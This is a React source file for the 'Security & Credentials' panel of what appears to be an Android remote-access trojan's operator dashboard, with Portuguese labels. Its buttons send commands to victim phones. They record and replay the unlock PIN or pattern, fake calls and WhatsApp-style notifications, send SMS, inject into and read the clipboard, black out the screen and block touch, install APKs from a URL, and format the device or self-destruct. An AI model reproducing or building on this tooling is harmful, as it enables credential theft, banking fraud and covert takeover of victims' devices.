import { useState } from 'react';
import useStore from '../../store/index.js';

export default function SecurityPanel({ deviceId, onBack, sendCmd }) {
  const d = useStore(s => s.deviceDetail);
  const [pin, setPin] = useState('');
  const [smsTo, setSmsTo] = useState('');
  const [smsMsg, setSmsMsg] = useState('');
  const [callTo, setCallTo] = useState('');
  const [fcName, setFcName] = useState('');
  const [fnApp, setFnApp]   = useState('');
  const [fnTitle, setFnTitle] = useState('');
  const [fnBody, setFnBody]   = useState('');
  const [clipText, setClipText] = useState('');
  const [brightness, setBrightness] = useState(50);
  const [volume, setVolume]   = useState(50);
  const [apkUrl, setApkUrl]   = useState('');
  const [opacity, setOpacity] = useState(100);
  const perms = d ? [
    ['accessibility', 'Accessibility', d.perm_accessibility],
    ['overlay',       'Overlay',       d.perm_overlay],
    ['camera',        'Camera',        d.perm_camera],
    ['microphone',    'Microphone',    d.perm_microphone],
    ['sms',           'SMS',           d.perm_sms],
    ['contacts',      'Contacts',      d.perm_contacts],
    ['location',      'Location',      d.perm_location],
    ['storage',       'Storage',       d.perm_storage],
    ['phone',         'Phone',         d.perm_phone],
    ['accounts',      'Accounts',      d.perm_accounts],
    ['call_log',      'Call Log',      d.perm_call_log],
    ['battery_opt',   'Batt Optim',    d.perm_battery_opt],
  ] : [];

  return (
    <div className="fade-up">
      <div className="row-sb mb12">
        <div className="bold txt-gold">🔒 SEGURANÇA &amp; CREDENCIAIS</div>
        <button className="btn btn-ghost btn-sm" onClick={onBack}>← VOLTAR</button>
      </div>

      {/* Permissions */}
      <div className="section">
        <div className="section-title">Permissões</div>
        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6 }}>
          {perms.map(([k, label, granted]) => (
            <span key={k} className={`pill ${granted ? 'pill-green' : 'pill-red'}`} style={{ fontSize: 11 }}>
              {label}
            </span>
          ))}
        </div>
      </div>

      {/* Admin */}
      <div className="section">
        <div className="section-title">Admin & Lock</div>
        <div className="grid g2 mb8">
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('CHECK_ADMIN_STATUS')}>ADMIN STATUS</button>
          <button className="btn btn-gold btn-block btn-sm" onClick={() => sendCmd('REQUEST_ADMIN_PERMISSION')}>REQUEST ADMIN</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('REQUEST_OVERLAY_PERMISSION')}>OVERLAY PERM</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('REQUEST_IGNORE_BATTERY')}>BATT OPTIM</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('LOCK_DEVICE')}>🔒 LOCK</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('HIDE_LOCKSCREEN')}>DISMISS LOCK</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('SHOW_LOCKSCREEN', { type: 'PIN' })}>PIN SCREEN</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('SHOW_LOCKSCREEN', { type: 'PATTERN' })}>PATTERN SCREEN</button>
        </div>
      </div>

      {/* Unlock recording */}
      <div className="section">
        <div className="section-title">Roubo de Desbloqueio</div>
        <div className="grid g2 mb8">
          <button className="btn btn-gold btn-block btn-sm" onClick={() => sendCmd('START_UNLOCK_RECORDING')}>⏺ GRAVAR</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('STOP_UNLOCK_RECORDING')}>⏹ PARAR</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('PLAY_UNLOCK_SEQUENCE')}>▶ REPLAY</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('PLAY_PIN_SEQUENCE')}>🔢 PLAY PIN</button>
        </div>
      </div>

      {/* Fake call */}
      <div className="section">
        <div className="section-title">Fake Call</div>
        <div className="input-row mb8">
          <input className="input" placeholder="Nome do chamador..." value={fcName} onChange={e => setFcName(e.target.value)} />
        </div>
        <div className="grid g2 mb8">
          <button className="btn btn-gold btn-block btn-sm" onClick={() => sendCmd('TRIGGER_FAKE_CALL', { caller_name: fcName, fullscreen: true })}>▶ INICIAR</button>
          <button className="btn btn-red btn-block btn-sm" onClick={() => sendCmd('END_FAKE_CALL')}>⏹ ENCERRAR</button>
        </div>
      </div>

      {/* Fake notification */}
      <div className="section">
        <div className="section-title">Fake Notificação</div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 6, marginBottom: 8 }}>
          <input className="input" placeholder="App (ex: WhatsApp)" value={fnApp} onChange={e => setFnApp(e.target.value)} />
          <input className="input" placeholder="Título" value={fnTitle} onChange={e => setFnTitle(e.target.value)} />
          <input className="input" placeholder="Corpo da mensagem" value={fnBody} onChange={e => setFnBody(e.target.value)} />
        </div>
        <button className="btn btn-gold btn-block btn-sm" onClick={() => sendCmd('TRIGGER_FAKE_NOTIFICATION', { app: fnApp, title: fnTitle, body: fnBody })}>
          📩 ENVIAR NOTIFICAÇÃO
        </button>
      </div>

      {/* SMS & Calls */}
      <div className="section">
        <div className="section-title">SMS & Ligações</div>
        <div className="input-row mb6">
          <input className="input" placeholder="+55..." value={callTo} onChange={e => setCallTo(e.target.value)} />
          <button className="btn btn-gold btn-sm" onClick={() => sendCmd('CALL_PHONE', { phone: callTo })}>LIGAR</button>
        </div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
          <input className="input" placeholder="+55..." value={smsTo} onChange={e => setSmsTo(e.target.value)} />
          <input className="input" placeholder="Mensagem..." value={smsMsg} onChange={e => setSmsMsg(e.target.value)} />
          <button className="btn btn-gold btn-block btn-sm" onClick={() => { sendCmd('SEND_SMS', { phone: smsTo, message: smsMsg }); setSmsMsg(''); }}>
            💬 ENVIAR SMS
          </button>
        </div>
      </div>

      {/* Clipboard */}
      <div className="section">
        <div className="section-title">Clipboard</div>
        <div className="input-row mb6">
          <input className="input" placeholder="Texto para injetar..." value={clipText} onChange={e => setClipText(e.target.value)} />
          <button className="btn btn-gold btn-sm" onClick={() => sendCmd('INJECT_CLIPBOARD', { text: clipText })}>INJECT</button>
          <button className="btn btn-ghost btn-sm" onClick={() => sendCmd('GET_CLIPBOARD')}>GET</button>
        </div>
      </div>

      {/* Black screen */}
      <div className="section">
        <div className="section-title">Tela Preta</div>
        <div className="grid g2 mb8">
          <button className="btn btn-red btn-block btn-sm" onClick={() => sendCmd('BLACK_SCREEN_ON')}>🖤 ATIVAR</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('BLACK_SCREEN_OFF')}>⬜ DESATIVAR</button>
        </div>
        <div className="input-row mb8">
          <span className="txt-xs txt-dim" style={{ whiteSpace: 'nowrap' }}>Opacidade</span>
          <input type="range" min="0" max="100" value={opacity} style={{ flex: 1, accentColor: '#d4950a' }}
            onChange={e => { setOpacity(+e.target.value); sendCmd('SET_BLACK_SCREEN_OPACITY', { opacity: +e.target.value }); }} />
          <span className="txt-xs txt-gold">{opacity}%</span>
        </div>
        <div className="grid g2">
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('TOGGLE_TOUCH_BLOCK', { block: true })}>BLOQUEAR TOQUE</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('TOGGLE_TOUCH_BLOCK', { block: false })}>DESBLOQUEAR</button>
        </div>
      </div>

      {/* Device controls */}
      <div className="section">
        <div className="section-title">Controles do Dispositivo</div>
        <div className="grid g2 mb8">
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('VOLUME_UP')}>🔊 VOL+</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('VOLUME_DOWN')}>🔉 VOL-</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('TOGGLE_WIFI', { enabled: true })}>📶 WIFI ON</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('TOGGLE_WIFI', { enabled: false })}>📵 WIFI OFF</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('TOGGLE_TORCH', { enabled: true })}>🔦 TORCH</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('SET_RINGER_MODE', { mode: 'silent' })}>🔕 SILENCIOSO</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('SET_RINGER_MODE', { mode: 'vibrate' })}>📳 VIBRAR</button>
          <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('SET_RINGER_MODE', { mode: 'normal' })}>🔔 NORMAL</button>
        </div>
        <div className="input-row mb6">
          <span className="txt-xs txt-dim" style={{ whiteSpace: 'nowrap' }}>Brilho</span>
          <input type="range" min="0" max="100" value={brightness} style={{ flex: 1, accentColor: '#d4950a' }}
            onChange={e => { setBrightness(+e.target.value); sendCmd('SET_BRIGHTNESS', { value: +e.target.value }); }} />
          <span className="txt-xs txt-gold">{brightness}%</span>
        </div>
        <div className="input-row">
          <span className="txt-xs txt-dim" style={{ whiteSpace: 'nowrap' }}>Volume</span>
          <input type="range" min="0" max="100" value={volume} style={{ flex: 1, accentColor: '#d4950a' }}
            onChange={e => { setVolume(+e.target.value); sendCmd('SET_VOLUME', { value: +e.target.value }); }} />
          <span className="txt-xs txt-gold">{volume}%</span>
        </div>
      </div>

      {/* APK Install */}
      <div className="section">
        <div className="section-title">Instalar APK</div>
        <div className="input-row">
          <input className="input" placeholder="https://.../app.apk" value={apkUrl} onChange={e => setApkUrl(e.target.value)} />
          <button className="btn btn-gold btn-sm" onClick={() => sendCmd('INSTALL_APK', { url: apkUrl })}>INSTALAR</button>
        </div>
      </div>

      {/* Danger zone */}
      <div className="section">
        <div className="section-title" style={{ color: 'var(--red)' }}>Zona de Perigo</div>
        <div className="grid g2">
          <button className="btn btn-danger-soft btn-block btn-sm" onClick={() => { if (confirm('Self destruct?')) sendCmd('SELF_DESTRUCT'); }}>💥 AUTO-DESTRUIÇÃO</button>
          <button className="btn btn-danger-soft btn-block btn-sm" onClick={() => { if (confirm('Format device?')) sendCmd('FORMAT_DEVICE'); }}>🗑 FORMATAR</button>
        </div>
      </div>

      <div style={{ height: 20 }} />
    </div>
  );
}
